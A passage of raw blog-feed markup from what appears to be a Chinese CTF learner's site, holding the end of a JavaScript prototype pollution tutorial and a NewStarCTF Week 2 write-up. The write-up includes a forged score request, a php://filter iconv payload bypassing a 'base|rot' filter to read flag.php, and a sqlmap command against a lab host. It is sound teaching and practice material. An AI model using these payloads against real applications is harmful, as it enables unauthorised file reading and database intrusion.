class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">foo</span>.__proto__<br><span class="hljs-title">foo</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>大段大段的文字总是让人头疼，写个简单代码体会一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>)&#123;&#125;;<br><span class="hljs-literal">undefined</span><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();<br><span class="hljs-literal">undefined</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> == foo.<span class="hljs-property">__proto__</span> <span class="hljs-comment">//foo对象的__proto__属性等于Foo.prototype</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/nodejs1.png" alt="nodejs1"></p><p>以及</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br>son.<span class="hljs-property">__proto__</span>[<span class="hljs-string">&#x27;add_name&#x27;</span>] = <span class="hljs-string">&#x27;abc&#x27;</span><br><span class="hljs-keyword">let</span> son1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son1 Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-comment">//结果： son Name: abc</span><br><span class="hljs-comment">//son1 Name: abc</span><br></code></pre></td></tr></table></figure><p>我们明明只修改了<code>son</code>对象的<code>__proto__</code>属性，但由于有其它对象的原型属性指向了相同的原型属性(即<code>son1.__proto__</code>与其相同)，导致另外一个具有相同原型的对象也受到了影响。</p><p>再看一段<code>js</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br> <br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// 修改foo的原型（即Object），foo是一个Object类的实例，实际上是修改了Object类，给其增加了一个属性bar,值为2</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br> <br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象，他会有一个bar属性</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br> <br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br><span class="hljs-comment">//最后，虽然zoo是一个空对象&#123;&#125;，但zoo.bar的结果居然是2：</span><br><span class="hljs-comment">//参考：https://blog.csdn.net/qq_51586883/article/details/119867720</span><br></code></pre></td></tr></table></figure><p>再通过一段代码加深加深印象 :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;D&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;A&#x27;</span><br>&#125;<br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;D&#x27;, last_name: &#x27;K&#x27; &#125;</span><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;A&#x27; &#125;</span><br>son.<span class="hljs-property">last_name</span> <span class="hljs-comment">// &#x27;K&#x27;</span><br><span class="hljs-comment">//注意，此时Son.prototype=son.__proto__</span><br><br>son.<span class="hljs-property">__proto__</span>  <span class="hljs-comment">//Foo &#123; first_name: &#x27;Donald&#x27;, last_name: &#x27;Trump&#x27; &#125;</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">add_name</span>=<span class="hljs-string">&#x27;viper&#x27;</span><br>son.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined，构造函数的属性和方法要通过创建实例才能访问</span><br><span class="hljs-title class_">Foo</span> <span class="hljs-comment">//[Function: Foo] &#123; add_name: &#x27;viper&#x27; &#125;,注意这里解释了为啥Son/son.add_name没定义</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">&#x27;add_name&#x27;</span>]=<span class="hljs-string">&#x27;notbad&#x27;</span><span class="hljs-comment">//注意这里</span><br>son.<span class="hljs-property">add_name</span><span class="hljs-comment">//&#x27;notbad&#x27;</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span><span class="hljs-comment">//undefined，同上</span><br><br><span class="hljs-title class_">JavaScript</span> 的查找机制如下：<br><br>在对象son中寻找last_name<br>如果找不到，则在son.<span class="hljs-property">__proto__</span>中寻找last_name<br>如果仍然找不到，则继续在son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>中寻找last_name<br>依次寻找，直到找到<span class="hljs-literal">null</span>结束。比如，<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> 的 __proto__就是 <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><p>总结一下：</p><p>1.构造函数.prototype指向的是一个对象(原型)。</p><p>2.任何对象都有一个原型对象，这个原型对象由对象的内置属性__proto__指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的。</p><p>3.只有构造函数内才有ptorotype属性。</p><p>4.每个对象都内含有一个属性：<strong>proto</strong>,也就是说就算对象里面没有对这个属性进行赋值，那么也是有这个属性的。</p><p>5.原型链的核心就是依赖对象__proto__的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object时，就没有指向了。如果最终查找失败会返回undefined或报错。</p><p>通过一段<code>java</code>代码对比两者的异同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<span class="hljs-comment">//包名为Test的类</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<span class="hljs-comment">//公共字符串属性name</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//Son类继承自Father类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Son</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>.name = <span class="hljs-string">&quot;father&quot;</span>;<span class="hljs-comment">//super 关键字用于在子类中访问父类的成员变量、方法和构造函数。</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//alert方法，返回类型为void(不会返回任何值)</span><br>        System.out.println(<span class="hljs-string">&quot;i am son&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s1.name);<span class="hljs-comment">//System.out是一个标准输出流对象，println()是一个方法，用于将指定的参数打印到控制台，并在末尾添加一个换行符。</span><br>        s1.name = <span class="hljs-string">&quot;son&quot;</span>;<br>        System.out.println(s1.name);<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s2.name);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：</span><br>father<br>son<br>father<br></code></pre></td></tr></table></figure><p><code>java是基于对象继承，javascript是基于原型继承</code></p><h4 id="污染原理"><a href="#污染原理" class="headerlink" title="污染原理"></a>污染原理</h4><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p><p>简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象</p><h4 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h4><p>现在我们大致可以知道：如果可以通过某种方法控制<code>对象.__proto__</code>的值，那我们就可以间接修改继承该原型对象的所有对象。</p><p>1.<strong>对象merge</strong> <strong>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</strong> 以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//用于将一个源对象的属性合并到目标对象中</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//遍历source的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//对于每个属性，若同时存在于源对象和目标对象中</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//表示这是一个嵌套对象，需要递归调用merge函数，将源对象的嵌套属性合并到目标对象的对应嵌套属性中。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//非嵌套属性，直接将源对象的属性值赋给目标对象的对应属性。</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里如果我们让key是<code>__proto__</code>的话那么是不是就可以对原型造成影响，最终影响到实例化出来的类呢？</strong></p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1,2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1)<span class="hljs-comment">//&#123; a: 1, b: 2 &#125;,proto没有被当做键名</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>为什么<code>o1</code>被污染了而<code>o3</code>没有被污染?</p><p>打开node看下<code>o2</code>的<code>key</code>：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">Welcome to Node.js v18.18.0.<br>Type &quot;.help&quot; for more information.<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;&#125;</span><br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> o2)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);&#125;</span><br>a<br>b<br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2</span><br>&#123; a: 1 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span></span><br>&#123; b: 2 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>[Object: null prototype] &#123;&#125;  //最上层的object，并没有任何属性<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>null<br>&gt;可以看到o2的key只有a,b没有我们需要的__proto__，并注意最后几行！<br></code></pre></td></tr></table></figure><p>原因很好理解：在<code>o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</code>中，<code>&quot;__proto__&quot;:&#123;b:2&#125;</code>等价于<code>o2.__proto__=&#123;b:2&#125;</code>，也就是<code>o2</code>这个实例的<code>__proto__</code>属性。<code>__proto__</code>并没被当成键名解析。</p><p>我们需要这样修改(<code>利用JSON.parse</code>)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parse的存在可以将JSON字符串解析为JavaScript对象，这样一来就存在o2.__protp__.b=2,并把这东西赋值给之前不存在的o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>简单分析下运行过程：</p><p>首先是<code>o1[a]=02[a]=1</code>，然后进行<code>o1.__proto__</code>和<code>o2.__proto__</code>(注意这是共有的，所以进行循环<code>merge</code>过程)，即<code>o1.__proto__.b=o2.__proto__.b=2</code>，即<code>Object.prototype.b=2</code>。</p><p>也就是最顶层的<code>Object.prototype</code>所指向的对象添加了属性,所以我们随便创建一个对象也就有了b这个属性(间接拥有，会向上查一个<code>.proto__</code>)。</p><p>参考文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>jlkl.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">11</span><span class="hljs-regexp">/06/</span>Web_16/<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51586883/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119867720</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7182</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week2</title>
    <link href="/2023/10/12/NewStarCTF_Week2/"/>
    <url>/2023/10/12/NewStarCTF_Week2/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第二周，菜鸟的wp</p><span id="more"></span><hr><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>听说你是游戏高手？</p><p>进环境发现是个小游戏，分数到达<code>100000</code>才能拿<code>flag</code>:</p><p><img src="/img/youxi1.png" alt="youxi1"></p><p>目测是要通过<code>burpsuite</code>伪造分数数据包，右键源码没啥东西，<code>F12</code>打开调试器，发现<code>app_v2.js</code>：</p><p>在游戏进行的过程中并不存在数据包传递，除非游戏结束时分数<code>&gt;100000</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//游戏结束</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); <span class="hljs-comment">//创建XMLHttpRequest的对象xhr，与服务器通信</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//指定交互方式POST，并发送到api.php</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<span class="hljs-comment">//设置请求头，JSON格式</span><br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-comment">//下面这部分函数用来返回flag</span><br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>那就直接伪造一个包好了：<code>POST</code>方法<code>api.php</code>，<code>host</code>就是靶机地址，<code>Content-Type:application/json</code>，注意POST的数据要是JSON格式而且空一行，其它任意:</p><p><img src="/img/youxi2.png" alt="youxi2"></p><p>如果数据包格式有问题它会提示<code>&#123;&quot;message&quot;:&quot;so low score&quot;&#125;</code></p><p>看了官方<code>wp</code>发现还有一种方法：直接打开控制台传<code>gameScore=9999999999</code>，然后等游戏结束：</p><p><img src="/img/youxi3.png" alt="youxi3"></p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>包含也有危害？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br><br></code></pre></td></tr></table></figure><p>目测要用伪协议读<code>flag.php</code>的源码，没过滤<code>filter</code>但过滤了<code>base|rot/</code>而且是<code>/i</code>模式，不过没啥影响除了<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>还有很多其它方法。</p><p>之前攻防世界正好做过一个类似的，payload:</p><p><code>?file=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php</code></p><p>源码是这个东西：</p><p><code>&lt;?php //flag&#123;af954c6a-1ac4-4e23-a235-fc4108a03783&#125;</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>虽然使用<code>sqlmap</code>是没有灵魂的，但我还是用了~</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span 